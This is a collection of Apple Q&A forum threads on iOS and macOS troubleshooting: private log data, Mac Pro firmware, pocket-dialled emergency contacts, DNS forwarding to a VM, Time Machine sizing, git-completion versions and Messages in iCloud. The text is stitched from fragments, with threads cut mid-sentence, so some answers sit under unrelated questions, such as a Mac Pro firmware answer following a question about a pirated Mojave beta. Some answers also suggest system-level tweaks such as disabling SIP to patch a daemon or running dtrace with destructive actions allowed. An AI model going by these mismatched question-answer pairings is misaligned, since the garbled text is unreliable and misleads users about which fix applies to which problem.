Preferences/Keyboard/Shortcuts — see this answer. \n", "Q: How to see  data in iOS logs? Looking at iOS 11 logs using Console.app in High Sierra, I see that many important bits of information are masked like this:\nnsurlsessiond   Triggering periodic update to powerlog for client <private>\ndasd    Trigger: <private> is now [<private>]\nYelp Reservations Map Extension [19 <private> <private>] start\n\nwhich makes it hard to see what's really happening.  This happens on macOS too, and it can be changed with this command sudo log config --mode 'private_data:on', as described here.  How can I enable logging private data on iOS?\n\nA: There is no single setting that you can change for iOS logging as there is for macOS.\nIf you are running a beta version of iOS, the private log information seems to be collected, so that is one option.\nThe other option is to see if there is a profile on this page that covers the logging you need.\nOnce you install the relevant profile you will see the previously <private> information appearing in the iOS console log.  \nIn my case I was able to use the \"Baseband\" profile to enable caller id logging while working on a CallKit extension. \nTo disable the private logging you simply remove the profile from general settings on the device.\n", "Q: No apple news app after the mojave upgrade I followed the steps to get a pirated version of mojave beta upgrade and everything is working fine except I don't see the much talked about apple news app, although other apps like voice memos, stocks and home are there.

The original MacPro has the model specification MacPro 1,1. Second, mine at home which was the first model introduced at WWDC back in time has been delivered with two dual core Xeons with 2.66GHz each in it, bus speed is 1.33GHz, RAM modules with at least 667MHz. Frankly, I never heard of a Core2Duo CPU in a MacPro. (see also http://apple-history.com/mac_pro)\n\n*The MacPro model 3,1 would be a MacPro Early 2008, so the guy you got the box from has made several modifications to it (to be polite and not to say \"messed up\"), including swapping the CPU's and installing a MacPro 3,1 firmware.\nThe MacPro 3,1 has 800MHz RAM modules and a bus speed of 1.6GHz and starts with two QuadCore 2.8GHz CPU's; additionally it is the first model with an 64bit EFI. (There is a BTO edition with only one 2.8GHz QuadCore CPU; my second MacPro under my desk which I have tuned to the max in the meantime.)\nAnd that is the reason, why the 3,1 firmware on your hardware 1,1 MacPro is totally wrong - the hardware specifications do not match in any way with the MacPro 3,1 firmware.\n\n*The MacPro from 2007 (Model ID 2,1) is just a hardware release with higher speed CPU's, but is hardware identical (motherboard) to the original MacPro 1,1. So with installing the 2,1 firmware on a MacPro 1,1 it becomes a 2,1 with the capability to run faster clocked CPU's. (That is what I am doing currently with my MacPro 1,1.)\n\n*MacPro 1,1 from 2006 including model 2,1 has a 32bit EFI which limits the OS you can install on to Mavericks natively. You can't change that. There are several tricks to the OS you can do for running Yosemite on it (swapping some libraries emulating a 64bit EFI).\n\n*The best native GPU you could buy at 2006 for a MacPro 1,1 was the ATI X1900XT. (Still have that in my hardware shelf wrapped in anti-static plastic).\nWhat you can do to have fun again with that box:\n\n\n*\n\n*Downgrade the firmware to 2,1 (You need that for a CPU Upgrade to 3.0GHz Xeon CPU's, if you want this.)\n\n*Try again your Snow Leopard installation and upgrade it to Lion (10.7.5) then.\n\n\nOR:\n\n\n*\n\n*Downgrade the Firmware to 2,1\n\n*Buy a CPU upgrade to the maximum possible on ebay to two 3.0GhZ\nXeons. \n\n*Install the CPU's (one ebay seller even provides an\ninstallation video for it; contact me for the link.)\n\n*Install Mavericks.\n\n\nI currently need to suppress the urge to book the next flight to you, fixing that good old manually sickened MacPro. :-)\n", "Q: Predictive input doesn’t work on Russian language I have iPhone 7 with iOS 11.4 and my keyboard freezes at random times for second.

The feed appears as it would on an iOS device.\nAlternatively, for some stories, you can tap on the Share Story button shown at bottom, copy the link and send it to yourself. However, this approach is highly manual, would have required following it since the day App Store redesign was publicly launched. Also, it is not possible to do so if you want to start out today as the older feed entries can no longer be accessed.\n", "Q: How do I display the speed limit on Google Maps in iOS? Is there a way to display the speed limit of an area in Google Maps on iOS?\nI know speed limit overlays for Google Maps are possible on Android through third party apps, but I haven't been able to find an equivalent option for iOS.\n\nA: According to Google's Product Forums, they're doing limited speed limit display tests in very specific areas.  I've seen San Francisco and Brazil being listed as the only places it's available right now.\nThey're also A/B testing in other locations.

Sometimes when carrying my iPhone X in my pocket, it starts making calls on its own. It calls the same person every time (my father).\nThe phone is configured as such:\n\n\n*\n\n*Phone locked\n\n*Face ID activated\n\n*Emergency contacts are set up in Health app - my father is one of them, but there are a few others, both before and after him on the list\n\n*In Settings → Emergency SOS I have:\nCall with side button: Off and\nCall automatically: Off\n\n*\"Today\" screen: I do not have the Favorites widget or any other widget for making calls.\n\n\nI have tried reproducing the problem by holding the right and top left side buttons pressed, but this only gives me the screen with a Swipe to turn off, Emergency info and Emergency SOS. No matter what I do, it does not just set up a call.\nI read a Reddit post, where a user experiencing this problem when walking up stairs, describes how the problem is triggered:\n\nAfter doing some experimentation, I think I figured it out.\nIf your iPhone is in your pocket and the screen is facing your body,\n  the motion that your legs make when walking up a set of stairs \"taps\"\n  the bottom left corner of the screen (at least for me).\nthe first tap registers as a swipe up, which, because FaceID is not\n  recognizing a face (because it's in your pocket), goes to the passcode\n  entry screen\n2) the second tap clicks the Emergency text in the bottom left of the\n  unlock screen\n3) the third tap clicks the Medical ID text in the bottom left of the\n  Emergency screen\n4) the fourth tap clicks the phone number of the second emergency contact at the very bottom\n\nThese symptoms match pretty well with what I'm seeing. I have experimented with adding/removing/sorting emergency contacts, and it does seem like it is the second emergency contact, sometimes the first, that gets called.\nAnother user in the Reddit thread suggests a solution:\n\nGo to Settings > Accessibility and turn off Tap to Wake\n\nHowever, in my case, I've already disabled Tap to Wake.\nWhat makes my phone want to call my father seemingly randomly, and what can I do to make it stop?\n\nA: Following hints from the Reddit post:\n\nIf your iPhone is in your pocket and the screen is facing your body,\n  the motion that your legs make when walking up a set of stairs \"taps\"\n  the bottom left corner of the screen (at least for me).\nthe first tap registers as a swipe up, which, because FaceID is not\n  recognizing a face (because it's in your pocket), goes to the passcode\n  entry screen\n2) the second tap clicks the Emergency text in the bottom left of the\n  unlock screen\n3) the third tap clicks the Medical ID text in the bottom left of the\n  Emergency screen\n4) the fourth tap clicks the phone number of the second emergency\n  contact at the very bottom\n\n... I found a solution that at in most cases prevents accidentally calling my emergency contacts:\n\n\n*\n\n*Create a new contact called \"Dummy\" or similar, with an invalid phone number (e.g. 12345678). Make sure you have at least one other emergency contact.\n\n*Go to the Settings app → Health → Emergency info, and find the Emergency contacts list \n\n*Reorder your emergency contacts so that \"Dummy\" is number 2 from the top\nThis setup will cause your Dummy contact, and not a real contact, to be called when the bottom part of your screen is tapped in your pocket. \n", "Q: Where does OS X store the list of processes?

Google suggested a minimum of 1.5x\nSo would that mean backing up 8TB to a 12TB disk is minimum ideal?\n\nA: You absolutely want to have 1 TB free minimum for a 4 TB amount of data. If you can’t use Time Machine to exclude any files that don’t need to be backed up (exclude the /System folder and all system files as well as any database / cache files like outlook cached data) and then see how large the space grows.\nTime Machine works best when you can delete files and have them saved for more than 6 months. If you’re not going to keep history, I would just do a sync / mirror using a product like Carbon Copy Cloner or Super Duper and rotate two drives in so you have one online sync and another that’s more distant.\nAs long as your data is static, and you don’t add or delete much, I would say 1 TB of free space would take about a year to get used up if you have normal small documents like papers, notes, some small photos coming and going and the bulk of the 8 TB is just a huge static library.\nIn your case - 4 TB free and 8 TB allocated after the initial backup seems like a very nice compromise. Within my totally unofficial “guidelines” and 50% room spare and reasonable size drives for the current size of HDD availability. A NAS or slower rotation drive would be fine if you want to save $$ and get the most space on one drive.\n\nSince you tagged this video - you might instead have two buckets of data - and can optimize things. Don’t backup your ingest and working copies to Time Machine - just the project files and the OS files. Then have a second way to store and archive long term storage.\nThat’s more work though. If you can throw a pair of 12 TB drives and let Time Machine run A and B backups for a year - that might be a very good investment.\n", "Q: How to forward local DNS queries to a VM when macOS is in offline mode? For a project I need to intercept/redirect DNS queries to a VM, which in turn runs dnsmasq. This VM is hosted by xhyve and when connected to the network, the setup works well; I have an file in /etc/resolver.conf/test.io which has:\n\nnameserver 192.168.64.20\nsearch_order 1\n\nDoing dig node.test.io @192.168.64.20 or dig node.test.io give the expected results.\nBut when going offline, there is a problem. It seems that when macOS is not connected to a network, it only allows /etc/resolver.conf/* entries to work when they use 127.0.0.1.\nI tried setting up a port-forwarding, like:\n\n$ echo \"                           \nrdr pass inet proto udp from any to 127.0.0.1 port 53 -> 192.168.64.20 port 53\n\" | sudo pfctl -ef -\n\nand changing /etc/resolver.conf/test.io to:\n\nnameserver 127.0.0.1\nsearch_order 1\n\nHowever, the domain test.io can not be found when I try to do a nslookup or dig node.test.io @localhost.

This happened yesterday, and I posted on Quora. No answer. It happened again today, so here I am cross-posting.\nSometimes, iTunes decides that, despite me quitting it, the right thing is to be open, with the result that I have to constantly quit or force quit it over and over again. It happened today, and between 10:35:01 and 10:44:33 I had to quit it OVER THIRTY-THREE TIMES. It happened yesterday as well, and between 9:35:26 and 10:28:27 I had to quit it AT LEAST FORTY-NINE TIMES.\nNot only does it open, but it plays random stuff that it's got in its \"All\". Luckily most of its picks are low-volume MIDIs from stuff I wrote on Finale, but it's still extra annoying because it typically happens as I am checking song lyrics so I have to listen well and the extraneous tune is distractive.\nI thought it might be an update check, so I turned auto-checking for updates OFF in the settings, but to no avail.\nAfter many of those 49 times, I tried deleting iTunes (a drastic solution given I basically never delete anything), but it is \"required by OSX\", so nothing happened.\nI am using Mac OSX 10.9.5, though I'm pretty sure this madness happened with my older 10.7.5 too, and iTunes 12.2.2.25.\nSo what in the world is going on, and how do I stop this fu..., err, copulator from doing this nonsense?\nEDIT\nLooks like the culprit are my earphones.

It also seems that thing is faulty, because thise things trigger even if I don't press the thingy.\nSo is there a way to disable this trigger?\n(Btw, another thing that gets triggered on the mobile sometimes is the ringer or media volume, and the volume also very rarely gets triggered on the Mac. No idea what triggers that though: the thingy triggers iTunes and Google listen, and there is nothing else on the headphones except for the thingy where the two cables for the ears join into the one that gets plugged into the earphone hole, but that doesn't seem to trigger anything.)\n\nA: https://thebitguru.com/projects/itunes-patch\n\nPlay Button iTunes Patch\nThe application will patch the Remote Control Daemon to prevent it from starting iTunes whenever you press the play button on the keyboard or an external remote control.\n\n\nThis does require SIP to be disabled, but it can be re-enabled once you've run this patch.\nThis does not work with macOS 10.13.

When I am in a rush I often plug my phone into it's charger and then turn it off (if I do it vise-versa it will turn on when I plug it in).  I have found it charges a estimated 1.5x faster then while charging turned in. I have never had a problem with this, although, since I am in a rush, I only have it plugged in for a little amount of time. \nCould I damage the battery or some other component if I have it charging, turned off, for an extended period of time?\n\nA: Short answer\nThis is perfectly fine to do, although the benefit of doing so is negligible.\nThe reason an iDevice will typically switch on when connected to a charging source is for usability reasons (i.e. due to User Experience considerations, not due to any hardware limitations). Likewise, you'll find in the case of a totally dead battery that plugging an iDevice into a charging source will not allow the user to switch on the device until the battery has been charged to about 5%.\nLong answer\nYour impression that it charges a estimated 1.5x faster then while charging turned on is probably due to the different stages of charging rather than the fact your iPhone was on/off during the period. \nTo clarify this somewhat, your iPhone uses a process known as trickle charging once your iPhone battery has reached 80% of its charge capacity. That is, the first 80% of a battery's capacity is charged at a much faster rater than the last 20%. This process increases the lifespan of your battery, not to mention lets you get going again faster in between charging sessions. \nSo, if you're plugging your phone in for short spurts every now and then in between uses, and thereby it's still switched on, it's much more likely to be at 80% or above or that it reaches that point sooner rather than later. And, once it does, trickle charging kicks in and that explains the impression that it's charging slower while your iPhone is switched on.\nAnother factor that affects battery performance and charging times is temperature. If your iPhone is switched on in the car and streaming Apple Music while also using Maps to navigate you to a destination it will charge a lot slower than it would otherwise, not only because of how much the phone is being actively used, but also because the temperature levels will rise under those conditions. So, for these reasons, if your phone is switched off while charging, then it's temperature level isn't likely to be an issue and, of course, it's not actively being used either.\nHowever, based on my own testing, having an iPhone switched off while charging only reduces charge time by between 1% to 2%, so it really is negligible. You'd get close to the same benefit by putting your iPhone into Airplane Mode and switching off Wi-Fi, which may be more convenient than switching off the phone altogether.\nIf you're keen, the following may be of interest to you: \n\n\n*\n\n*Myth need to be solved: will the battery drain faster in places with poor wifi signals?\n\n*Why is it better for an iPhone’s battery to NOT close down apps?\n\nA: The phone will still have trickle charging while power off. So don't worry you can go ahead and turn it off while charging. It wont hurt the battery as the trickle charging still function.\n", "Q: `dtrace_deadman_timeout` modification for dtrace scripts such as dtruss? When running some intensive debugging that needs to run on the order of about 5 minutes, I'm finding that dtrace's deadman switch is being triggered regularly and cannot get to the error that is being tracked:\ndtrace: processing aborted: Abort due to systemic unresponsiveness\n\nIt appears that I could modify the parameters of deadman with perhaps dtrace_deadman_timeout being the most promising. These can be found here and the slide is as follows:\n\nWhat is the appropriate way to set such parameters on macOS (specifically 10.13.x)?\n\nA: I've had the same issue. I don't know if it's encouraged, but you can use the \"-w\" flag to \"allow destructive actions.\" This seems to have fixed the issue for me. However I have no idea what the consequences are. I'm running a very simple script though, so I'm reasonably confident that I'm not doing anything that is very \"destructive.\"\nThis was hard to find, it was a pdf of slides of a presentation given on dtrace and I get the feeling that MacOS only begrudgingly allows basic DTrace support these days. This is too bad because DTrace is an incredibly powerful tool.\nFor the sake of any poor soul who wanders here with similar issues, the official DTrace book is really helpful and while it doesn't have all the answers, it has probably most of them.\n", "Q: old iPad, new Mac, transfer iMessage logs I have an iPad that I have had for a while, I recently bought a new Mac. \nI have a lot of chat history on iMessage already on the iPad, is there a way to sync it to the messages app on the MAC?\n\nA: After updating to iOS 11.4 or greater and macOS High Sierra 10.13.5 or greater you should be able to use iMessage on iCloud. This would allow you to sync your message data across iCloud, so when you sign in from your mac all your messages from your iPad appear on your Mac. To enable that settings follow the tutorial here.\nEnable on iOS\n\nEnabling this feature is simple. Open the Settings app, then tap the\n  Apple ID settings with your name at the top of the page. On the Apple\n  ID page, Tap \"iCloud,\" then toggle on \"Messages.\" If you have not set\n  up two-factor authentication, Apple will walk you through the process\n  here.\nOnce 2FA has been enabled, the Messages icon should be as well.\nOnce you enable the \"Messages\" toggle, when you open up the Messages\n  app, it should say \"Uploading Messages to Cloud\" to indicate it's\n  doing just that. If you're not connected to Wi-Fi and not plugged in\n  to charge via USB, you will get an \"Uploading to iCloud Paused\"\n  message stating to plug in your device and connect to Wi-Fi. Once it's\n  done, the popups will disappear.\n\nEnable on macOS\n\nNow, you won't notice anything different about Messages right away.\n  Most of Messages in iCloud's features are under the hood. However, if\n  you are running the iOS 11.4 on another device or if your Mac is\n  running macOS 10.13.5 (it needs to be enabled in the Messages\n  settings), you'll notice what happens on one Messages app happens on\n  the other.\nIf you enabled it on your iOS device already, you should get a prompt\n  on your Mac to enable it. If not, open the Messages app, then click on\n  \"Messages\" in the menu bar, followed by \"Preferences.\" From there,\n  click on the \"Accounts\" tab, and select the iMessage account listed on\n  the left side of the window. If you haven't already, you may need to\n  check the box that says \"Enable this account.\" When that's good, check\n  the box next to \"Enable Messages in iCloud\" (beta versions at one\n  point called it \"Enable Messages on iCloud\").\n\nIf you don't see this option, you are likely still running iOS 11.3.4\n  and will need to update your software.\n\n", "Q: iPhone asks for iCloud password on power charge Whenever I plug my iPhone to charge it, iCloud asks me to re-enter my password. How can I fix this?\nI'm using iOS 11.4.\n\nA: Resetting the settings has solved the problem.\n", "Q: Switch between fullscreen apps, wrap around? I have multiple full screen applications running on my Mac. I use three finger swipe to scroll through them. When they are in order I have to move from app 1 to app n by swiping n times. Is there a way to wrap them around so that when i swipe beyond app n, I can reach app 1?\n\nA: No but you can use cmd + Tab if you want a wraparound. Another thing you can do is this:\nSwipe up with three fingers. You’ll see every window that is opened right now. If it isn’t fullscreen it will be somewhere in the middle of your screen. If it is in Fullscreen it will be on top next to the desktop window. You can order them by holding one and then moving it to the position you want. \nFor instance you have Safari, Pages and Calender opened and you want Pages to be the first fullscreen after swiping with three fingers from the desktop. You only have to swipe with three fingers up and drag the Safari fullscreen right next to desktop.\n\n\nA: There is no way to perform such wrap around. However, there's an easier way to overcome the problem of swiping left or right n number of times.\nYou can enable Mission Control gesture for your Trackpad and easily swipe up to reveal all the running full screen apps and Spaces. Then it's possible to easily click to jump to desired full screen app or Space.\n\nIt is also possible to rearrange individual Spaces and full screen apps by dragging and dropping. You can even move them between monitors if you use a multi screen setup.\n", "Q: Getting error in Terminal when typing Passwd *Username* I’ve been trying to change the root password via Terminal on macOS.

If a log into my user and then try that it works perfectly but I want to change it from the “cmd+S” menu.\n\nA: To use passwd in single-user mode or otherwise make changes to accounts on the system, you need to load Open Directory.\nlaunchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist\n\n", "Q: Multiple Wi-Fi Services on Mac At home, I have my own network. I have set up a DHCP fixed-address connection for that.\nHowever, not all networks like that, and so I have set up another Service in Network preferences that just uses plain DHCP.\nHowever, I can't set them to only connect to certain networks: changing settings in the Advanced window adjusts them for all Wi-Fi Services. This means I have both connections going. \nHow do I change the settings for just one Service, so I can set it to only connect to a certain network?\n\nA: This is the purpose of a Location. With only one Wi-Fi service, create a new location at the top of the window. Settings such as DHCP only apply to the currently selected location. Locations can be switched from this menu or from anywhere using the Apple menu once created.\n\n", "Q: maps.app on iOS \"follow me\" mode without a destination set In stand-alone automotive GPS systems if you just have it on but have not programmed in a specific destination it will show your moving on an active scrolling street map of the road you are on and any roads that are currently within the default zoom area.\nSo you get a display that shows your car stationary in the middle of the screen with the map moving around you. I found this extremely helpful when I am in locations that I am not real familiar with or just exploring to get the lay of the land. It's also good for finding shortcuts that you were not previously aware of.\nIf I open Apple maps (or Waze or Google maps...) tap on the locator (Apple maps arrow at top right) to display my current location the map does not follow me. I eventually drive off the displayed map and would have to tap the arrow to re-center the map. Needless to say operating a phone while you are driving is both Not Really Safe and unlawful in many parts of the US.\nIs that something that Apple Maps does and I have not discovered how to activate it? Anybody know what that feature is called?\n\nA: Make sure you have background app refresh turned on for Maps.  \nGo to Settings -> Maps and in the Allow Maps to Access section, turn on Background App Refresh and Cellular Data.  \nAlso, be sure you allow Maps to use your location by tapping Location and selecting While Using the App.\nThis is what I have done and the app follows me when I move.  I'm not sure if this is the root answer to your issue but it's how I have it setup and it works for me.\n\nA: Many years later and I still find myself wanting this type of functionality. The main reason I typically want this is to see curves coming up in the road, so I need the map to follow me and for it to orient itself to my perspective. It sometimes difficult cognitively to reorient the map in my head to determine left/right, east/west, etc.\nI employ two options:\n\n*\n\n*Just enter in some sort of destination near the general area I'm heading. If I'm making my own way, the navigation will generally re-route well enough. Occasionally, I find that it will tell me to u-turn for quite a while, but the display is usually still useful. I can definitely be distracting though.\n\n*Google Maps on iPhones now has a mode somewhat like this. When tapping the arrow (find me/follow me) icon the map will tilt forward, and rotate to face the direction I'm headed in. It's not as good as dedicated car navigation, but it decent. The biggest downside to this is how cluttered Google Maps is when not in navigation mode. It tries to recommend all sorts of restaurants and \"local guides\" type crap I'm not interested in.\n\nBoth work alright, but #1 is my go to. If I have the luxury of planning my trip ahead of time, I'll find key points I want to navigate to, put them in the Reminders app with the URL field containing the Apple Maps URL, and I'll \"check\" them off the list as I reach them, then tap the next destination. That at least keeps Maps from making overly direct routes, since the directions are in small segments.\nAn example:\nSay I want to circumnavigate a city clockwise, going from the north side to the south side. Typically, any navigation app will route me straight south through the city. To form a meandering route, I'd drop a pin in Maps somewhere around 2 o'clock on the outskirts of the city. I'll \"Share\" the pin, and choose \"Copy to Clipboard\", then create a Reminder with that as the URL, and label it something like Point 1 or the name of the neighborhood I'm aiming for. Then I'd drop another pin at around 4 o'clock on the Map around the general area I want to hit, copy its URL, and add another Reminder for Point 2, and my final destination at around 6 o'clock. I'll do this with as many points as I need to form my course that the navigation will generally stick to. It's usually only a handful for a given day-trip.\nAnother good step is getting directions between Point 1 and 2, and 3, 3 and 4, etc.\nOnce I think Apple Maps will navigate me between points without trying to take me too far off my general route, I can start getting directions to each point, and checking them off the list one by one. This means I have to manually change the directions as I reach these intermediate destinations. I'll typically do this re-routing at stop lights as I near the end of a route segment. Apple Maps does the re-routing to the intermediate destinations automatically of course, so that still may be annoying, but with this \"workflow\" I like that functionality overall.\nI recently did a trip like this that I pre-routed, even though I previewed routes for specific segments, on the day of things were different, so I missed a good chunk of road I wanted to see. It's important to really nail the places you want to see, so although it can be a pain to keep choosing a new destination, more \"stops\" in your route may be a better option. Ignoring the directions a bit more is another option, that probably takes more mental discipline. (Once you're navigating in the app, it's easy to forget you're also exploring.)\nI'm still looking for the \"Garmin\" type experience on an iPhone.\n", "Q: Open web page with macOS Safari in different language Is it possible to make Safari open a web page in a different language without having to change the whole system language?\nI need to test if the Angular translations come out right but changing system language every time is really annoying.\n\nA: I'm not sure it's possible to independently change Safari’s accept-language, but try this terminal command, replacing ’en-AU’ depending on what language you would like:\n/Applications/Safari.app/Contents/MacOS/Safari -AppleLanguages '(en-AU)'\n\nYou should be able to do it with Firefox, via Preferences/General/Language\n", "Q: Open fullscreen apps to left of Desktop 1 space In Settings -> Mission Control, you have the option to open a new space to the far right or to the right of the current space via the \"Automatically rearrange Spaces based on most recent use\" checkbox.\nWhat is a way, perhaps through a terminal command or otherwise, to have new spaces open to the left of Desktop 1 (primary space)?\n\nA: Up to the current macOS (10.14.2), there is no way to change the default position of full-screen application.\n", "Q: Where is iCloud after an upgrade to ios11 I upgraded to ios11 and not only have my iCloud files disappeared - the entire iCloud app is not available.

I was surprised when my iPhone 6 (IOS 12.3.1) would not send a message but instead gave the error above.  Going to the apple site here (https://selfsolve.apple.com/deregister-imessage/), I came across an additional step which I have not had to do before.  Even with iMessage off in settings, I was still getting the error message, \"iMessage needs to be enabled to send this message.\"  I don't know if this is new for IOS 12, but once I turned off FaceTime according to the instructions in the link above, then my message app let me send straight SMS to a contact on which I had previously been getting the error.\n\nA: If you're using Data most of the time, I suggest turning off data for iMessages in cellular settings. This will send them as regular messages given other settings in JBis's answer are in place. This might require additional step in previously \"Blue\" threads which is: Hold the message and tap \"send as text message.\"\nThis method doesn't delete previous threads and you can continue a blue green combo thread given the recipient is a phone number. \n\nA: \nHow do I turn it off? ... I don't want to use it. I have unlimited SMS so don't see the point.\n\niMessage IS the SMS app. If you turn it off, you also turn off SMS. If you only want to message people via SMS then use their phone number and not their email as the message destination. These messages will appear in green, messages in blue are via apple ID.\nAn iMessage text will cost nothing so your reason for not wanting to use iMessage is unclear.

Apps may not use their own mechanisms to unlock content or\n  functionality, such as license keys, augmented reality markers, QR\n  codes, etc. Apps and their metadata may not include buttons, external\n  links, or other calls to action that direct customers to purchasing\n  mechanisms other than in-app purchase.\n  \n*Apps may use in-app purchase currencies to enable customers to “tip” digital content providers in the app.\n  \n*Any credits or in-game currencies purchased via in-app purchase may not expire, and you should make sure you have a restore mechanism\n  for any restorable in-app purchases.\n  \n*Remember to assign the correct purchasability type or your app will be rejected.\n  \n*Apps should not directly or indirectly enable gifting of in-app purchase content, features, or consumable items to others.\n  \n*Apps distributed via the Mac App Store may host plug-ins or extensions that are enabled with mechanisms other than the App Store.\n  Apps offering “loot boxes” or other mechanisms that provide randomized\n  virtual items for purchase must disclose the odds of receiving each\n  type of item to customers prior to purchase.\n  \n*Non-subscription apps may offer a free time-based trial period before presenting a full unlock option by setting up a Non-Consumable\n  IAP item at Price Tier 0 that follows the naming convention: “XX-day\n  Trial.” Prior to the start of the trial, your app must clearly\n  identify its duration, the content or services that will no longer be\n  accessible when the trial ends, and any downstream charges the user\n  would need to pay for full functionality. Learn more about managing\n  content access and the duration of the trial period using Receipts and\n  Device Check.\n\nThis line basically means\n\nif you delete the app, move to a new phone, whatever, your purchases\n  will no longer be available on that device. Restore Purchases asks\n  iTunes what of the available in-app purchases you've paid for.\n\nIt does say \"should\" which you could imply to mean that it is not forced but highly suggested.\n", "Q: \"System Extension Blocked\" after upgrade to macOS 10.14 Beta (18A293u) Keep popping up this window if I don't click \"Allow\".

I'm using a new MacBook Pro 15\" with macOS 10.13.4 configured with the default Color LCD color profile. I'm doing some graphic design work and noticed that all colors in Chrome and Safari appear \"washed out\" when compared to Firefox. The latter has more saturated/vibrant colors. And this happens to native HTML/CSS elements (i.e. not images only).\nHere's a screenshot of the SmashingMagazine homepage with the comparison (Chrome on the left, Firefox on the right). Notice how the colors are more vibrant in Firefox (right):\n\nIf I change my display's color profile to sRGB IEC61966-2.1, then both Chrome and Firefox look the same.\nWhy is this? Any help is greatly appreciated.\n\nA: To Get Firefox looking like Chrome and Safari\nBy default, Firefox only applies color correction to images that have embedded color profiles. You can enable full color management to apply color correction to everything, including colors defined in CSS. Then it should look more like Chrome and Safari.\nIn about:config (type that in to the address bar), set gfx.color_management.mode to 1.\nhttps://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Releases/3.5/ICC_color_correction_in_Firefox\nColor Correction, Over Simplified\nMonitors have different response curves. For example, the difference between #FF0000 and #FA0000 may be noticeable on some monitors, and not on others.\nColor profiles contain the skews to compensate for this by altering the actual output, in an attempt to preserve contrast and overall accuracy of the intended appearance. They can be applied to monitors, printers, and other devices.\nMany image formats support embedded color profiles; think of it boiling down to descriptors on how it’s supposed to look. If the system knows the inaccuracies of your monitor, it can combine that profile with the image’s profile to skew the output for the best possible reproduction.\nWhen it comes to things without profiles, such as color values in CSS, some assumptions about intent must be made.\nLet’s say your monitor does indeed produce a discernible difference between the two similar colors mentioned before. You use those colors in your CSS. The assumption is that your intent was to show the subtle difference. Some monitors out there may end up displaying the same color on the screen, despite the two colors being sent to them. Color correction alters the colors sent to the screen so a subtle difference actually is reproduced. If you wanted them to appear the same, you’d have just used #FF0000 and never bothered with #FA0000, right?\nDigital Color Meter is aware of color profiles in use. This is why it gives different values over the same image across two different displays, and different values depending on what color space you’ve selected.\n\nA: Funny to read the \"experts'\" replies. They simply need to run Firefox against their browser on their calibrated monitors to see the the very real difference. Whatever Firefox is doing (yes, Firefox, not a color profile, not a hardware device) it is enhancing vibrancy and providing a warmer color experience.\n", "Q: MacBook Pro (Mac OS X Mavericks) not displaying full resolution on external Philips QHD monitor I know this question has been answered a few times before in relation to other monitors and Mac OS X versions, but due to my limited knowledge I am after specific help with my setup.\nI have a 2012 MacBookPro running Mac OS X Mavericks 10.9.5.

After some digging, I finally figured out what the root problem is.\nThey made some major changes to the git-completion.bash script which requires a new feature in git v2.18, --list-cmds. The problem is that none of the package managers have updated to git v2.18 yet.\nMost of the instructions out there say to download raw.githubusercontent.com/git/git/master/contrib/completion/git-completion.bash . But that is not necessarily the best option because sometimes you will be downloading a newer git-completion.bash than your version of git supports.\nSo the solution is to download the git-completion.bash version that matches your git version. Then source it again. In this case:\nhttps://raw.githubusercontent.com/git/git/v2.17.1/contrib/completion/git-completion.bash\nNotice that it is referencing v2.17.1 instead of master.

To release an app to the App Store or build one you need a Mac. So my sister offered me her 13\" 2013 MacBook Air (128GB) for €200 (~$230). It's still running pretty well, so price-wise it's worth it (I guess). \nBut I heard that to use Xcode, you need the latest version, which is usually bound to the latest OS version. \nIs this true? Do I need the latest OS version (High Sierra as of now) to develop and publish Mac/iOS apps?\n\nA: The short answer is no, not necessarily. \nVersions of Xcode, like any software, will have a minimum version of the operating system it requires to run. However, that isn't necessarily the latest version of the OS.\nSome examples:\n\n\n*\n\n*Xcode 9.2 requires as a minimum macOS Sierra 10.12.6 to run\n\n*Xcode 9.3 requires as a minimum macOS High Sierra 10.13.2 to run\n\n\nThis highlights the crux of the assumption in your question - that you need the latest version of Xcode to develop and publish apps. However, this assumption is false. Developers do not have to use the latest version of Xcode to develop and publish apps to the Mac or iOS App Stores. In fact, you don't necessarily have to use Xcode at all.\nHaving said all that, the latest release version of Xcode (9.4.1) requires macOS High Sierra 10.13.2 to run, so in that sense it does require the latest major version of macOS (although not the latest minor version). But, as I said, you don't need to use the latest version of Xcode to develop/publish an app.\n", "Q: How can I completely disable SW updates on iPhone?

Typically, when a user creates a reminder on their iPhone they have the option of setting a 'repeat' schedule (e.g. Every Day, Every Week, etc). However, this option is only available when the reminder is set to notify them at a particular date/time.\nOn the other hand, if a user wants to create a reminder that notifies them when they’re arriving at or leaving a particular location, there is no 'repeat' option. This means if a user wants to create a reminder that reminds them, for example, to do something whenever they arrive home, they can’t. There’s just no way to make it repeat every time they arrive home. \nUnfortunately, asking Siri to do this also doesn’t work.\nIs there a way to create a repeating reminder based on location, not time?\n\nA: If you don't mark the reminder as complete but simply dismiss the reminder, it will stay active and you will be reminded each time you arrive at (or leave) the location.\n\nA: As of the current version of iOS (iOS 11.4) this is not natively possible. However, you can do this by installing IFTTT. \nIFTTT (or If This Then That) is a free web service that also provides an iOS app. More information about IFTTT generally is available on Wikipedia and you can also visit the offical IFTTT website. \nIn a nutshell, however, IFTTT allows you to take advantage of thousands of applets/services that work with hundreds of apps.\nTo create a repeating location based reminder, follow these steps:\n\n\n*\n\n*Download/install the IFTTT app (Note: You will need to be running iOS 10 or later to install it)\n\n*Launch the app and either sign in with Google or Facebook, or sign up using an email address\n\n*Conduct a search for \"Receive a notification when you enter a certain location\"\n\n*Tap on the Receive a notification when you enter a certain location search result\n\n*Tap on the Turn on toggle switch (Note: After doing this your screen may slide over to present you with other applets you may like. If this happens, tap on the back arrow to go back to the previous screen.)\n\n*Tap on the cog at top right to configure this applet\n\n*Tap on the Locate an area field and enter the address of the location you want to trigger your reminder\n\n*Tap on Save at top right\n\n*Swipe up until you see the Message field \n\n*Enter the text you want to be displayed on your reminder notifications\n\n*Tap on Done\n\n*Tap on Save\nIt typically takes a few minutes for the service/applet to take effect, but once it does you’ll get a reminder whenever you arrive at the location you entered.\nNOTES: \n\n\n*\n\n*There will be many similar applets that can perform the same action. This answer just provides one example of how users can achieve this functionality.\n\n*Likewise, you’ll be able to find applets that work to remind you when you’re leaving a location.\n\n", "Q: Time Machine backup to different subnet fails after update to macOS 10.13 We used a Mac Pro running server app as time machine target. The Mac Pro is on a different subnet, so we had to add it as a time machine target via command line:\nsudo tmutil setdestination -ap afp://user@host.domain.tld/timemachine\n\nThis worked pretty well on several machines. Today, I upgraded the Mac Pro from OS X 10.10 and Server 5.0 to macOS 10.13 and Server 5.6. This means, the time machine target stuff was moved from the server into the operating system. I checked the sharing settings:\nSystem Preferences -> Sharing -> File Sharing -> timemachine, rightclick -> Advanced options:\n\nShare 